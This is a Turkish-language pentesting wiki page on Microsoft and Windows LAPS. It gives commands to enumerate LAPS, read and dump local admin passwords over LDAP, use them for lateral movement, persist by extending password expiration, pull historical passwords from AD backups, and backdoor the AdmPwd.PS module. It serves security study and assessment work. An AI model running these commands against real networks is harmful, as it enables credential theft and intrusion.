# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Temel Bilgiler

Bir değerlendirme sırasında karşılaşabileceğiniz şu anda **2 LAPS çeşidi** vardır:

- **Legacy Microsoft LAPS**: yerel administrator password'ünü **`ms-Mcs-AdmPwd`** içinde ve expiration time'ı **`ms-Mcs-AdmPwdExpirationTime`** içinde saklar.
- **Windows LAPS** (April 2023 güncellemelerinden beri Windows içine gömülü): hâlâ legacy mode'u emüle edebilir, ancak native mode'da **`msLAPS-*`** attribute'larını kullanır, **password encryption**, **password history** ve domain controller'lar için **DSRM password backup** desteği sunar.

LAPS, **local administrator password'lerini** yönetmek için tasarlanmıştır; bunları domain'e joined bilgisayarlarda **unique, randomized ve frequently changed** hale getirir. Bu attribute'ları okuyabiliyorsanız, genellikle etkilenen host'a **local admin olarak pivot** yapabilirsiniz. Birçok environment'ta ilginç olan kısım yalnızca password'ün kendisini okumak değil, aynı zamanda password attribute'larına erişim yetkisi **kimlere delegations edildiğini** bulmaktır.

### Legacy Microsoft LAPS attributes

Domain'in computer object'lerinde, legacy Microsoft LAPS implementasyonu iki attribute'un eklenmesine yol açar:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS, computer object'lerine birkaç yeni attribute ekler:

- **`msLAPS-Password`**: encryption etkin değilken JSON olarak saklanan clear-text password blob'u
- **`msLAPS-PasswordExpirationTime`**: planlanan expiration time
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: domain controller'lar için encrypted DSRM password verisi
- **`msLAPS-CurrentPasswordVersion`**: daha yeni rollback-detection mantığı tarafından kullanılan GUID-based version tracking (Windows Server 2025 forest schema)

**`msLAPS-Password`** okunabiliyorsa, değer account name, update time ve clear-text password içeren bir JSON object'tir; örneğin:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Aktif olup olmadığını kontrol et
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` adresinden **raw LAPS policy** dosyasını indirebilir ve ardından bu dosyayı insan tarafından okunabilir formata dönüştürmek için [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) paketinden **`Parse-PolFile`** kullanabilirsiniz.

### Legacy Microsoft LAPS PowerShell cmdlets

Eğer legacy LAPS module yüklüyse, genellikle aşağıdaki cmdlets kullanılabilir:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS, yeni bir PowerShell module ve yeni cmdlets ile gelir:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Burada birkaç operasyonel detay önemlidir:

- **`Get-LapsADPassword`** otomatik olarak **legacy LAPS**, **clear-text Windows LAPS** ve **encrypted Windows LAPS** işlemlerini yapar.
- Eğer password encrypted ise ve siz onu **read** edebiliyor ama **decrypt** edemiyorsanız, cmdlet **clear-text password**’ü döndüremese bile **`Source`**, **`DecryptionStatus`** ve **`AuthorizedDecryptor`** gibi metadata bilgilerini döndürür.
- **encrypted Windows LAPS** içinde **read permission** ve **decrypt permission** **farklı kontrollerdir**. OU / object read access sahibi olmak, otomatik olarak **`msLAPS-EncryptedPassword`** decrypt edebileceğiniz anlamına gelmez.
- **Password history**, yalnızca **Windows LAPS encryption** etkinleştirildiğinde kullanılabilir.
- Domain controller’larda döndürülen source **`EncryptedDSRMPassword`** olabilir.

Bu, bir assessment sırasında faydalıdır çünkü **`AuthorizedDecryptor`** alanı size blob’un **hangi user veya group** için encrypted edildiğini söyler ve çoğu zaman başarısız bir password read denemesini yeni bir privilege-escalation hedefine dönüştürür.

### PowerView / LDAP

**PowerView** ayrıca **kim password’u read edebilir ve onu read etmek için nasıl kullanılacağını** bulmak için de kullanılabilir:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Eğer **`msLAPS-Password`** okunabiliyorsa, döndürülen JSON’u ayrıştırın ve parola için **`p`** ile yönetilen yerel admin hesabı adı için **`n`** alanını çıkarın.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Bu **`n`** alanı, daha yeni kurulumlarda önemlidir çünkü **Windows LAPS automatic account management** yerleşik **`Administrator`** yerine bir **custom account** hedefleyebilir ve daha yeni **Windows 11 24H2 / Windows Server 2025** sistemleri bu hesap adını hatta **randomize** edebilir.

### Linux / remote tooling

Modern tooling, hem legacy Microsoft LAPS hem de Windows LAPS destekler.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notlar:

- Son **NetExec** sürümleri **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** ve **`msLAPS-EncryptedPassword`** destekler.
- **`pyLAPS`**, Linux üzerinden **legacy Microsoft LAPS** için hâlâ kullanışlıdır, ancak yalnızca **`ms-Mcs-AdmPwd`** hedefler.
- **`LAPS4LINUX`**, **`dpapi-ng`** tabanlı tooling ve yeni **NetExec** iş akışları gibi daha yeni platformlar arası araçlar, Windows dışı hostlardan **native Windows LAPS** ile de başa çıkabilir.
- Ortam **encrypted Windows LAPS** kullanıyorsa, basit bir LDAP read yeterli değildir; ayrıca **authorized decryptor** olmanız gerekir (veya offline domain DPAPI-NG root key material gibi eşdeğer decryption material).
- **Windows 11 24H2 / Windows Server 2025** üzerinde, yönetilen local admin'in her zaman **`Administrator`** olduğunu varsaymayın. Automatic account management özel bir account oluşturabilir ve isteğe bağlı olarak adını randomize edebilir; bu yüzden **`--laps`** kullanmadan önce ölçekli kullanımda account adını önce **`n`** / **`Account`** üzerinden keşfedin.

### Directory synchronization abuse

Direct read access yerine her computer object üzerinde domain-level **directory synchronization** rights'ınız varsa, LAPS yine de ilginç olabilir.

**`DS-Replication-Get-Changes`** ile **`DS-Replication-Get-Changes-In-Filtered-Set`** veya **`DS-Replication-Get-Changes-All`** birleşimi, legacy **`ms-Mcs-AdmPwd`** gibi confidential / RODC-filtered attributes'ı synchronize etmek için kullanılabilir. BloodHound bunu **`SyncLAPSPassword`** olarak modeller. Replication-rights arka planı için [DCSync](dcsync.md) kontrol edin.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit), birkaç function ile LAPS enumeration'ını kolaylaştırır.\
Bunlardan biri, **LAPS enabled** olan tüm computers için **`ExtendedRights`** parse etmektir. Bu, özellikle protected groups içindeki users olan, **LAPS passwords okumak için delegated edilmiş** **groups**'u gösterir.\
Bir domain'e bir computer **join etmiş** bir **account**, o host üzerinde `All Extended Rights` alır ve bu right, **account**'a **passwords okuma** yeteneği verir. Enumeration, bir host üzerindeki LAPS password'unu okuyabilen bir user account gösterebilir. Bu, LAPS passwords okuyabilen belirli AD users'ı **target** almamıza yardımcı olabilir.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## NetExec / CrackMapExec ile LAPS Parolalarını Dökme

Eğer etkileşimli bir PowerShell'iniz yoksa, bu yetkiyi LDAP üzerinden uzaktan kötüye kullanabilirsiniz:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Bu, kullanıcının okuyabildiği tüm LAPS secrets değerlerini dump eder ve farklı bir local administrator password ile yatay hareket etmenize olanak tanır.

## LAPS Password Kullanma
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Son Kullanma Tarihi

Admin olduktan sonra, **parolaları elde etmek** ve bir makinenin **parolasını güncellemesini** engellemek için **son kullanma tarihini geleceğe ayarlamak** mümkündür.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS bunun yerine **`msLAPS-PasswordExpirationTime`** kullanır:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Parola yine de bir **admin** **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`** kullandığında, ya da **Do not allow password expiration time longer than required by policy** etkinleştirildiğinde döner.

### Yeni Windows LAPS üzerinde snapshot rollback uyarısı

Eski snapshot / image rollback hileleri, yeni **Windows LAPS** dağıtımlarına karşı **daha az güvenilir**. **Windows 11 24H2 / Windows Server 2025** üzerinde, forest schema **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**) içeriyorsa, client yerel olarak cache’lenmiş bir GUID’i AD’de depolanan değerle karşılaştırır ve bir rollback **torn state** oluşturduğunda **parolayı hemen döndürür**.

Pratikte bu, snapshot tabanlı persistence veya eski, bilinen bir local admin parolasını geri getirme girişimlerinin, bir sonraki normal expiration’a kadar hayatta kalmak yerine hızla boşa çıkabileceği anlamına gelir.

Bu koruma yalnızca **AD-backed Windows LAPS** için geçerlidir ve geri alınan makinenin yeniden **AD ile authenticate** olabilmesine hâlâ bağlıdır. Makine artık AD ile konuşamıyorsa, **password history** veya **AD backup access** yine işi kurtarabilir.

### Automatic account management kurcalama uyarısı

**automatic account management** etkin olduğunda, Windows LAPS yönetilen local admin account’un yaşam döngüsünü yönetir. Bu account’u yeniden adlandırmaya, yeniden yapılandırmaya veya başka şekilde kurcalamaya yönelik beklenmedik girişimler **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`** ile reddedilebilir; bu yüzden yönetilen LAPS account’unu sessizce değiştirmeye dayanan persistence, yeni endpoint’lerde daha az güvenilirdir.

### AD backup’larından historical passwords kurtarma

**Windows LAPS encryption + password history** etkin olduğunda, bağlanmış AD backup’ları ek bir secrets kaynağı olabilir. Bağlanmış bir AD snapshot’a erişebiliyor ve **recovery mode** kullanabiliyorsanız, canlı bir DC ile konuşmadan daha eski saklanmış parolaları sorgulayabilirsiniz.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Bu çoğunlukla **AD backup theft**, **offline forensics abuse** veya **disaster-recovery media access** sırasında geçerlidir.

### Backdoor

Legacy Microsoft LAPS için orijinal source code [burada](https://github.com/GreyCorbel/admpwd) bulunabilir, bu nedenle koda bir backdoor eklemek mümkündür (örneğin `Main/AdmPwd.PS/Main.cs` içindeki `Get-AdmPwdPassword` methodunun içine) ve bu kod bir şekilde **yeni passwords sızdırabilir veya onları bir yerde saklayabilir**.

Ardından, yeni `AdmPwd.PS.dll` dosyasını compile edip makineye `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` yoluna upload edin (ve modification time'ını değiştirin).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
